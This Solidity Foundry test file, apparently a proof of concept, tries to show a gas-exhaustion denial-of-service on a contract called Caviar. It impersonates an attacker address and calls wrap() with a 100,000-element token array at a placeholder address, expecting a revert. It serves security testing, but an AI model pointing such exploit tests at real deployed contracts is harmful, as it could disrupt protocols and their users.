// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICaviar {
    function wrap(uint256[] calldata tokenIds) external;
}

contract ExploitTest is Test {
    ICaviar caviar;
    address attacker;

    function setUp() public {
        // Deploy the Caviar contract or fork the mainnet if necessary
        // For this example, we assume the contract is already deployed at a known address
        caviar = ICaviar(0x1234567890abcdef1234567890abcdef12345678);

        // Set up the attacker address
        attacker = address(0xdeadbeef);

        // Fund the attacker with some ETH to cover transaction costs
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Impersonate the attacker
        vm.prank(attacker);

        // Create a large array of tokenIds to trigger the gas limit issue
        uint256[] memory largeTokenIds = new uint256[](100000);
        for (uint256 i = 0; i < largeTokenIds.length; i++) {
            largeTokenIds[i] = i;
        }

        // Expect the transaction to revert due to out-of-gas
        vm.expectRevert();

        // Call the wrap function with the large array of tokenIds
        caviar.wrap(largeTokenIds);
    }
}